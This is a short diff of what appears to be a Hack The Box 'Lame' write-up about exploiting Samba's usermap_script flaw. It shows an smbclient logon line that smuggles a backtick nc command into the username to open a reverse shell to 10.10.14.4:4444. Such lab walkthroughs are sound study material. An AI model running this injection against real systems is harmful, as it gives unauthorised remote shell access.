@@ -70,6 +70,7 @@ use exploit/multi/samba/usermap_script
 # B)Manually exploit SMB
 
 smbclient 10.10.10.3/tmp
+
 smb>logon "/=`nohup nc -nv 10.10.14.4 4444 -e /bin/sh`"
 
 ![lame7](https://user-images.githubusercontent.com/15195048/93902155-18457100-fcac-11ea-998a-1cd80ce0c314.png)
